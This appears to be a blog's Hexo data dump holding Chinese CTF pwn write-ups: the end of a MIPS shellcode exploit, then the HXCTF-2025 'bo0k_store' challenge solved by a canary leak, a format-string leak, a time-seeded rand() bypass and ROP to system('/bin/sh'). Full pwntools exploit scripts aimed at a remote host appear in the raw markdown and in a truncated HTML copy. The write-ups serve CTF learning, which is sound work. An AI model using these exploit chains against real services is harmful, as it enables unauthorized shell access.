class=\"string\">&quot;choice: &quot;</span>,<span class=\"built_in\">str</span>(op))</span><br><span class=\"line\">bss=<span class=\"number\">0x004115F0</span></span><br><span class=\"line\">name=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x38</span>+p32(bss+<span class=\"number\">0x10</span>)+p32(<span class=\"number\">0x00400F50</span>)</span><br><span class=\"line\">shellcode=asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">addiu $sp, -0x40</span></span><br><span class=\"line\"><span class=\"string\">li $t7, 0x69622f2f</span></span><br><span class=\"line\"><span class=\"string\">sw $t7, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">li $t6, 0x68732f6e</span></span><br><span class=\"line\"><span class=\"string\">sw $t6, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\">sw $zero, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\">la $a0, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">li $v0, 4011</span></span><br><span class=\"line\"><span class=\"string\">move $a1, $zero</span></span><br><span class=\"line\"><span class=\"string\">move $a2, $zero</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">nop</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;here:\\n&quot;</span>,name)</span><br><span class=\"line\">menu(<span class=\"number\">7</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;feeling:&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x3c</span>+p32(bss+<span class=\"number\">0x10</span>+<span class=\"number\">0x18</span>+<span class=\"number\">0x40</span>)+shellcode</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>写两道题,对mips下的程序的一个调用一下就开朗了.对shellcode ,寄存器的运用也提高了,还是收获不小.这两道题上手也是非常的快. </p>\n<p>不过第一道题似乎需要uClibc,我是之前分析DIR-815固件时,binwalk提取出来这个libc ,我就直接用了.</p>\n<p>第二道题直接给了uClibc,可以直接写.</p>\n"},{"title":"HXCTF-2025-决赛彩蛋","cover":"/img/治不开心药.png","_content":"# bo0k_store\n\n## ida分析\n**先用checksec 看了一下保护机制--全开**\n\n### mian函数\n![image-20250525114939255](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525114939255.png)\n1.可以看到，会循环调用menu，进行选择进入不同的book_store.\n2.当v3=1668508013时，是另一题的彩蛋，不用管他。\n3.按照1 2 3 的顺序依次查看各个选项的内容。\n\n### 选项1--b0ok_store\n![image-20250525115233521](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115233521.png)\n1.两次输入0x19字节。为什么呢？熟悉的同学可能会想到，第一次覆盖canary高字节，然后再改回去。所以这个地方是留个我们泄露canary的。应该是的\n2.同时注意到这个b0ok_times,它的初始值为1，所以只有一次机会利用这个选项。\n\n### 选项2--b00k_store\n![image-20250525115622638](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115622638.png)\n1.熟悉的格式化字符串漏洞，8字节的大小还是太长了，可以泄露很多东西。\n2.具体怎么使用还是需要动调看栈上有什么数据可以泄露。\n3.这题目是开启了所有保护机制，所以极有可能是用来泄露pie 和 stack 的。\n\n### 选项3--bo0k_store\n![image-20250525120159544](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525120159544.png)\n1.本题的核心重点，来了。首先可以看到这里的read。老朋友了，0x50的读入，有0x28的空间留给我们去rop，应该是利用这里泄露libc再返回执行system。\n2.但是这里有一个随机数，我们需要正确的输入随机数，才能顺利的继续执行。那么我们要如何绕过这个可恶的随机数呢？\n\n## rand 伪随机数\n### 方法1--ctypes\n[CTF中的PWN——srand()/rand()漏洞（栈溢出）_ctf rand-CSDN博客](https://blog.csdn.net/weixin_39194641/article/details/103089862)\n[随机数利用](https://n0we11.github.io/2023/10/16/PWN中的随机数漏洞/)\n\n1.在这两篇博客当中说的很简单，就是rand()是基于时间戳生成的随机数，所以只要我们用同样的函数，同样的参数，同样的时间，就能得到同样的随机数。\n2.所以我们使用ctypes库，调用c的链接库和函数得出应该结果，再把结果输入给本题的程序就行。\n3.这种方法，比较看运行的速度? 如果有延迟导致的不同时间，就要尝试几次。\n\n### 方法2--奇技淫巧\n\n[奇思妙想（破解随机数） | 未来大pwn子的blog](https://heshi906.github.io/2023/09/23/奇思妙想（破解随机数）/index.html)\n1.这篇博客的方法甚得我心。就是我直接自己也写一个程序，生成10s后的随机数，然后拿这个结果，去输入。后续重复运行题目程序，去撞这个时间。\n2.在我的解法中就是利用了这个，与方法1比，这个比较吃手法，因为按的太快，就卡不上10s。按得太慢也卡不上10s 。但是实际操作感觉容错还是挺高的，基本上我每一次都能通，而且远程也没问题。\n\n## gdb 分析\n### 找偏移和泄露\n![image-20250525122212160](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122212160.png)\n1.选项1是刚好覆盖到canary，没什么好说的，经典手法了。\n\n![image-20250525122423039](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122423039.png)\n1.这里可以泄露栈基址和pie。如果有其他条件配合的话，还可以有更美妙的利用\n\n## 利用思路\n1.首先在选项1中泄露canary，再从选项2中拿到pie和stack。这样就可以在选项3中，泄露libc。然后把返回地址设置成通过随机数检验的read的地址，直接读入，就不用第二次输入随机数了。\n2.所以，第一次在选项3中的输入需要注意rbp的值不能随意覆盖，必须得是合法的地址。拿到pie之后我们可以把rbp写成bss段上的地址。这样下一次的输入，就会在bss段上。最后leave ret时，会跳转过来继续执行。当然也可以写stack上的某个地址。\n\n## exp\n```python\nfrom pwn import *\nfrom ctypes import *\ncontext.log_level='debug'\nmode=1\nurl='43.139.51.42'\nport=9999\nlibc=ELF(\"./libc.so.6\")\n#exp=cdll.LoadLibraary(\"./libc.so.6\")\nexe=process(\"./rand\")\nelf=ELF(\"./pwn\")\n# 提前10s 拿到随机数 注意这里结尾有换行符\nrand=exe.recvline()[5:]\noffset=0x18\n\ndef choice(op,io):\n\tio.recvuntil(\"You choice: \\n\")\n\tio.sendline(str(op))\n\ndef leak_stack_pie(io):\n\t#leak-stack & canary\n\tchoice(2,io)\n\tpayload=b'%9$p%8$p'.ljust(8,b\"\\x41\")\n\tio.sendafter(\"What b00k do you want??\\n\",payload)\n\t#gdb.attach(io)\n\tbase=int(io.recv(14),16)-0x1989-196\n\tstack=int(io.recv(14),16)\n\tprint(hex(base))\n\tprint(hex(stack))\n\tlog.success(\"base-{}\".format(hex(base)))\n\treturn base,stack\n\t\ndef leak_canary(io):\n\tchoice(1,io)\n\tpayload=b'a'*0x18+b'b'\n\tio.sendafter(\"What b0ok do you want??\\n\",payload)\n\tio.recvuntil(\"ab\")\n\tcanary=u64(io.recv(7).rjust(8,b\"\\x00\"))\n\tprint(hex(canary))\n\tio.sendafter(\"Confirm again\\n\",b'\\x00'*0x19)\n\treturn canary\n\t\n\t\ndef pwn(mode):\n\tif mode==0 :\n\t\tio=process(\"./pwn\")\n\telse:\n\t\tio=remote(url,port)\n\t\n\tcanary=leak_canary(io)\n\tbase,stack=leak_stack_pie(io)\n\t# got&plt\n\tputs_got=elf.got[\"puts\"]+base\n\tputs_plt=elf.plt[\"puts\"]+base\n\t# gadget\n\tpop_rdi=0x13F6+base\n\tret=0x13F7+base\n\tread=0x1878+base\n\t# leak-libc\n\tchoice(3,io)\n\t#gdb.attach(io)\n\trand\n\tio.sendafter(\"Let's get started\\n\",rand)\n\tpayload=offset*b'a'+p64(canary)\n\tpayload+=p64(elf.bss()+base+0x800)+p64(pop_rdi)\n\tpayload+=p64(puts_got)+p64(puts_plt)+p64(read)\n\t#io.recvuntil(\"OK! You are right!!!\\n\")\n\t#gdb.attach(io,\"b *bo0k_store\")\n\tio.sendafter(\"What bo0k do you want??\\n\",payload)\n\tio.recvuntil(\"This book is for you\\n\")\n\tputs=u64(io.recv(6).ljust(8,b'\\x00'))\n\tprint(hex(puts))\n\tlibcbase=puts-libc.sym[\"puts\"]\n\t#log.success(\"libc-{}\".format(hex(libc)))\n\tsystem=libcbase+libc.sym[\"system\"]\n\tbin_sh=libcbase+0x1d8678\n\t#rop \n\tpayload=0x18*b'a'+p64(canary)+p64(canary)+p64(pop_rdi)\n\tpayload+=p64(bin_sh)+p64(ret)+p64(system)\n\t\n\tio.send(payload)\n\tio.interactive()\n\nfor i in range(12):\n\ttry:\n\t\tpwn(mode)\n\texcept:\n\t\tprint(\"again!\")\n\t\n```\n## rand 源码\n**gcc 编译之后才能运行哦**\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nint main(){\n\tsrand(time(0)+10);\n\tint random=rand()%1131796;\n\tprintf(\"rand:%d\\n\",random);\n}\n```","source":"_posts/ctf比赛复现/HXCTF决赛/bo0k_store.md","raw":"---\ntitle: HXCTF-2025-决赛彩蛋\ntags:\n    - 随机时间\n    - pwn\ncategories:\n    - 比赛记录\ncover: /img/治不开心药.png\n---\n# bo0k_store\n\n## ida分析\n**先用checksec 看了一下保护机制--全开**\n\n### mian函数\n![image-20250525114939255](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525114939255.png)\n1.可以看到，会循环调用menu，进行选择进入不同的book_store.\n2.当v3=1668508013时，是另一题的彩蛋，不用管他。\n3.按照1 2 3 的顺序依次查看各个选项的内容。\n\n### 选项1--b0ok_store\n![image-20250525115233521](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115233521.png)\n1.两次输入0x19字节。为什么呢？熟悉的同学可能会想到，第一次覆盖canary高字节，然后再改回去。所以这个地方是留个我们泄露canary的。应该是的\n2.同时注意到这个b0ok_times,它的初始值为1，所以只有一次机会利用这个选项。\n\n### 选项2--b00k_store\n![image-20250525115622638](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115622638.png)\n1.熟悉的格式化字符串漏洞，8字节的大小还是太长了，可以泄露很多东西。\n2.具体怎么使用还是需要动调看栈上有什么数据可以泄露。\n3.这题目是开启了所有保护机制，所以极有可能是用来泄露pie 和 stack 的。\n\n### 选项3--bo0k_store\n![image-20250525120159544](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525120159544.png)\n1.本题的核心重点，来了。首先可以看到这里的read。老朋友了，0x50的读入，有0x28的空间留给我们去rop，应该是利用这里泄露libc再返回执行system。\n2.但是这里有一个随机数，我们需要正确的输入随机数，才能顺利的继续执行。那么我们要如何绕过这个可恶的随机数呢？\n\n## rand 伪随机数\n### 方法1--ctypes\n[CTF中的PWN——srand()/rand()漏洞（栈溢出）_ctf rand-CSDN博客](https://blog.csdn.net/weixin_39194641/article/details/103089862)\n[随机数利用](https://n0we11.github.io/2023/10/16/PWN中的随机数漏洞/)\n\n1.在这两篇博客当中说的很简单，就是rand()是基于时间戳生成的随机数，所以只要我们用同样的函数，同样的参数，同样的时间，就能得到同样的随机数。\n2.所以我们使用ctypes库，调用c的链接库和函数得出应该结果，再把结果输入给本题的程序就行。\n3.这种方法，比较看运行的速度? 如果有延迟导致的不同时间，就要尝试几次。\n\n### 方法2--奇技淫巧\n\n[奇思妙想（破解随机数） | 未来大pwn子的blog](https://heshi906.github.io/2023/09/23/奇思妙想（破解随机数）/index.html)\n1.这篇博客的方法甚得我心。就是我直接自己也写一个程序，生成10s后的随机数，然后拿这个结果，去输入。后续重复运行题目程序，去撞这个时间。\n2.在我的解法中就是利用了这个，与方法1比，这个比较吃手法，因为按的太快，就卡不上10s。按得太慢也卡不上10s 。但是实际操作感觉容错还是挺高的，基本上我每一次都能通，而且远程也没问题。\n\n## gdb 分析\n### 找偏移和泄露\n![image-20250525122212160](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122212160.png)\n1.选项1是刚好覆盖到canary，没什么好说的，经典手法了。\n\n![image-20250525122423039](https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122423039.png)\n1.这里可以泄露栈基址和pie。如果有其他条件配合的话，还可以有更美妙的利用\n\n## 利用思路\n1.首先在选项1中泄露canary，再从选项2中拿到pie和stack。这样就可以在选项3中，泄露libc。然后把返回地址设置成通过随机数检验的read的地址，直接读入，就不用第二次输入随机数了。\n2.所以，第一次在选项3中的输入需要注意rbp的值不能随意覆盖，必须得是合法的地址。拿到pie之后我们可以把rbp写成bss段上的地址。这样下一次的输入，就会在bss段上。最后leave ret时，会跳转过来继续执行。当然也可以写stack上的某个地址。\n\n## exp\n```python\nfrom pwn import *\nfrom ctypes import *\ncontext.log_level='debug'\nmode=1\nurl='43.139.51.42'\nport=9999\nlibc=ELF(\"./libc.so.6\")\n#exp=cdll.LoadLibraary(\"./libc.so.6\")\nexe=process(\"./rand\")\nelf=ELF(\"./pwn\")\n# 提前10s 拿到随机数 注意这里结尾有换行符\nrand=exe.recvline()[5:]\noffset=0x18\n\ndef choice(op,io):\n\tio.recvuntil(\"You choice: \\n\")\n\tio.sendline(str(op))\n\ndef leak_stack_pie(io):\n\t#leak-stack & canary\n\tchoice(2,io)\n\tpayload=b'%9$p%8$p'.ljust(8,b\"\\x41\")\n\tio.sendafter(\"What b00k do you want??\\n\",payload)\n\t#gdb.attach(io)\n\tbase=int(io.recv(14),16)-0x1989-196\n\tstack=int(io.recv(14),16)\n\tprint(hex(base))\n\tprint(hex(stack))\n\tlog.success(\"base-{}\".format(hex(base)))\n\treturn base,stack\n\t\ndef leak_canary(io):\n\tchoice(1,io)\n\tpayload=b'a'*0x18+b'b'\n\tio.sendafter(\"What b0ok do you want??\\n\",payload)\n\tio.recvuntil(\"ab\")\n\tcanary=u64(io.recv(7).rjust(8,b\"\\x00\"))\n\tprint(hex(canary))\n\tio.sendafter(\"Confirm again\\n\",b'\\x00'*0x19)\n\treturn canary\n\t\n\t\ndef pwn(mode):\n\tif mode==0 :\n\t\tio=process(\"./pwn\")\n\telse:\n\t\tio=remote(url,port)\n\t\n\tcanary=leak_canary(io)\n\tbase,stack=leak_stack_pie(io)\n\t# got&plt\n\tputs_got=elf.got[\"puts\"]+base\n\tputs_plt=elf.plt[\"puts\"]+base\n\t# gadget\n\tpop_rdi=0x13F6+base\n\tret=0x13F7+base\n\tread=0x1878+base\n\t# leak-libc\n\tchoice(3,io)\n\t#gdb.attach(io)\n\trand\n\tio.sendafter(\"Let's get started\\n\",rand)\n\tpayload=offset*b'a'+p64(canary)\n\tpayload+=p64(elf.bss()+base+0x800)+p64(pop_rdi)\n\tpayload+=p64(puts_got)+p64(puts_plt)+p64(read)\n\t#io.recvuntil(\"OK! You are right!!!\\n\")\n\t#gdb.attach(io,\"b *bo0k_store\")\n\tio.sendafter(\"What bo0k do you want??\\n\",payload)\n\tio.recvuntil(\"This book is for you\\n\")\n\tputs=u64(io.recv(6).ljust(8,b'\\x00'))\n\tprint(hex(puts))\n\tlibcbase=puts-libc.sym[\"puts\"]\n\t#log.success(\"libc-{}\".format(hex(libc)))\n\tsystem=libcbase+libc.sym[\"system\"]\n\tbin_sh=libcbase+0x1d8678\n\t#rop \n\tpayload=0x18*b'a'+p64(canary)+p64(canary)+p64(pop_rdi)\n\tpayload+=p64(bin_sh)+p64(ret)+p64(system)\n\t\n\tio.send(payload)\n\tio.interactive()\n\nfor i in range(12):\n\ttry:\n\t\tpwn(mode)\n\texcept:\n\t\tprint(\"again!\")\n\t\n```\n## rand 源码\n**gcc 编译之后才能运行哦**\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nint main(){\n\tsrand(time(0)+10);\n\tint random=rand()%1131796;\n\tprintf(\"rand:%d\\n\",random);\n}\n```","slug":"ctf比赛复现/HXCTF决赛/bo0k_store","published":1,"date":"2025-10-06T14:48:09.870Z","updated":"2025-10-06T14:56:52.018Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2io0042uomyc3c2ccea","content":"<h1 id=\"bo0k-store\"><a href=\"#bo0k-store\" class=\"headerlink\" title=\"bo0k_store\"></a>bo0k_store</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><p><strong>先用checksec 看了一下保护机制–全开</strong></p>\n<h3 id=\"mian函数\"><a href=\"#mian函数\" class=\"headerlink\" title=\"mian函数\"></a>mian函数</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525114939255.png\" alt=\"image-20250525114939255\"><br>1.可以看到，会循环调用menu，进行选择进入不同的book_store.<br>2.当v3&#x3D;1668508013时，是另一题的彩蛋，不用管他。<br>3.按照1 2 3 的顺序依次查看各个选项的内容。</p>\n<h3 id=\"选项1–b0ok-store\"><a href=\"#选项1–b0ok-store\" class=\"headerlink\" title=\"选项1–b0ok_store\"></a>选项1–b0ok_store</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115233521.png\" alt=\"image-20250525115233521\"><br>1.两次输入0x19字节。为什么呢？熟悉的同学可能会想到，第一次覆盖canary高字节，然后再改回去。所以这个地方是留个我们泄露canary的。应该是的<br>2.同时注意到这个b0ok_times,它的初始值为1，所以只有一次机会利用这个选项。</p>\n<h3 id=\"选项2–b00k-store\"><a href=\"#选项2–b00k-store\" class=\"headerlink\" title=\"选项2–b00k_store\"></a>选项2–b00k_store</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525115622638.png\" alt=\"image-20250525115622638\"><br>1.熟悉的格式化字符串漏洞，8字节的大小还是太长了，可以泄露很多东西。<br>2.具体怎么使用还是需要动调看栈上有什么数据可以泄露。<br>3.这题目是开启了所有保护机制，所以极有可能是用来泄露pie 和 stack 的。</p>\n<h3 id=\"选项3–bo0k-store\"><a href=\"#选项3–bo0k-store\" class=\"headerlink\" title=\"选项3–bo0k_store\"></a>选项3–bo0k_store</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525120159544.png\" alt=\"image-20250525120159544\"><br>1.本题的核心重点，来了。首先可以看到这里的read。老朋友了，0x50的读入，有0x28的空间留给我们去rop，应该是利用这里泄露libc再返回执行system。<br>2.但是这里有一个随机数，我们需要正确的输入随机数，才能顺利的继续执行。那么我们要如何绕过这个可恶的随机数呢？</p>\n<h2 id=\"rand-伪随机数\"><a href=\"#rand-伪随机数\" class=\"headerlink\" title=\"rand 伪随机数\"></a>rand 伪随机数</h2><h3 id=\"方法1–ctypes\"><a href=\"#方法1–ctypes\" class=\"headerlink\" title=\"方法1–ctypes\"></a>方法1–ctypes</h3><p><a href=\"https://blog.csdn.net/weixin_39194641/article/details/103089862\">CTF中的PWN——srand()&#x2F;rand()漏洞（栈溢出）_ctf rand-CSDN博客</a><br><a href=\"https://n0we11.github.io/2023/10/16/PWN%E4%B8%AD%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E/\">随机数利用</a></p>\n<p>1.在这两篇博客当中说的很简单，就是rand()是基于时间戳生成的随机数，所以只要我们用同样的函数，同样的参数，同样的时间，就能得到同样的随机数。<br>2.所以我们使用ctypes库，调用c的链接库和函数得出应该结果，再把结果输入给本题的程序就行。<br>3.这种方法，比较看运行的速度? 如果有延迟导致的不同时间，就要尝试几次。</p>\n<h3 id=\"方法2–奇技淫巧\"><a href=\"#方法2–奇技淫巧\" class=\"headerlink\" title=\"方法2–奇技淫巧\"></a>方法2–奇技淫巧</h3><p><a href=\"https://heshi906.github.io/2023/09/23/%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3%EF%BC%88%E7%A0%B4%E8%A7%A3%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%89/index.html\">奇思妙想（破解随机数） | 未来大pwn子的blog</a><br>1.这篇博客的方法甚得我心。就是我直接自己也写一个程序，生成10s后的随机数，然后拿这个结果，去输入。后续重复运行题目程序，去撞这个时间。<br>2.在我的解法中就是利用了这个，与方法1比，这个比较吃手法，因为按的太快，就卡不上10s。按得太慢也卡不上10s 。但是实际操作感觉容错还是挺高的，基本上我每一次都能通，而且远程也没问题。</p>\n<h2 id=\"gdb-分析\"><a href=\"#gdb-分析\" class=\"headerlink\" title=\"gdb 分析\"></a>gdb 分析</h2><h3 id=\"找偏移和泄露\"><a href=\"#找偏移和泄露\" class=\"headerlink\" title=\"找偏移和泄露\"></a>找偏移和泄露</h3><p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122212160.png\" alt=\"image-20250525122212160\"><br>1.选项1是刚好覆盖到canary，没什么好说的，经典手法了。</p>\n<p><img src=\"https://gitee.com/jiang-xunpan/my_pic/raw/master/img/image-20250525122423039.png\" alt=\"image-20250525122423039\"><br>1.这里可以泄露栈基址和pie。如果有其他条件配合的话，还可以有更美妙的利用</p>\n<h2 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h2><p>1.首先在选项1中泄露canary，再从选项2中拿到pie和stack。这样就可以在选项3中，泄露libc。然后把返回地址设置成通过随机数检验的read的地址，直接读入，就不用第二次输入随机数了。<br>2.所以，第一次在选项3中的输入需要注意rbp的值不能随意覆盖，必须得是合法的地址。拿到pie之后我们可以把rbp写成bss段上的地址。这样下一次的输入，就会在bss段上。最后leave ret时，会跳转过来继续执行。当然也可以写stack上的某个地址。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;43.139.51.42&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">9999</span></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#exp=cdll.LoadLibraary(&quot;./libc.so.6&quot;)</span></span><br><span class=\"line\">exe=process(<span class=\"string\">&quot;./rand&quot;</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 提前10s 拿到随机数 注意这里结尾有换行符</span></span><br><span class=\"line\">rand=exe.recvline()[<span class=\"number\">5</span>:]</span><br><span class=\"line\">offset=<span class=\"number\">0x18</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">choice</span>(<span class=\"params\">op,io</span>):</span><br><span class=\"line\">\tio.recvuntil(<span class=\"string\">&quot;You choice: \\n&quot;</span>)</span><br><span class=\"line\">\tio.sendline(<span class=\"built_in\">str</span>(op))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_stack_pie</span>(<span class=\"params\">io</span>):</span><br><span class=\"line\">\t<span class=\"comment\">#leak-stack &amp; canary</span></span><br><span class=\"line\">\tchoice(<span class=\"number\">2</span>,io)</span><br><span class=\"line\">\tpayload=<span class=\"string\">b&#x27;%9$p%8$p&#x27;</span>.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x41&quot;</span>)</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;What b00k do you want??\\n&quot;</span>,payload)</span><br><span class=\"line\">\t<span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">\tbase=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x1989</span>-<span class=\"number\">196</span></span><br><span class=\"line\">\tstack=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(base))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack))</span><br><span class=\"line\">\tlog.success(<span class=\"string\">&quot;base-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(base)))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> base,stack</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak_canary</span>(<span class=\"params\">io</span>):</span><br><span class=\"line\">\tchoice(<span class=\"number\">1</span>,io)</span><br><span class=\"line\">\tpayload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>+<span class=\"string\">b&#x27;b&#x27;</span></span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;What b0ok do you want??\\n&quot;</span>,payload)</span><br><span class=\"line\">\tio.recvuntil(<span class=\"string\">&quot;ab&quot;</span>)</span><br><span class=\"line\">\tcanary=u64(io.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;Confirm again\\n&quot;</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x19</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> canary</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>(<span class=\"params\">mode</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> mode==<span class=\"number\">0</span> :</span><br><span class=\"line\">\t\tio=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tio=remote(url,port)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tcanary=leak_canary(io)</span><br><span class=\"line\">\tbase,stack=leak_stack_pie(io)</span><br><span class=\"line\">\t<span class=\"comment\"># got&amp;plt</span></span><br><span class=\"line\">\tputs_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]+base</span><br><span class=\"line\">\tputs_plt=elf.plt[<span class=\"string\">&quot;puts&quot;</span>]+base</span><br><span class=\"line\">\t<span class=\"comment\"># gadget</span></span><br><span class=\"line\">\tpop_rdi=<span class=\"number\">0x13F6</span>+base</span><br><span class=\"line\">\tret=<span class=\"number\">0x13F7</span>+base</span><br><span class=\"line\">\tread=<span class=\"number\">0x1878</span>+base</span><br><span class=\"line\">\t<span class=\"comment\"># leak-libc</span></span><br><span class=\"line\">\tchoice(<span class=\"number\">3</span>,io)</span><br><span class=\"line\">\t<span class=\"comment\">#gdb.attach(io)</span></span><br><span 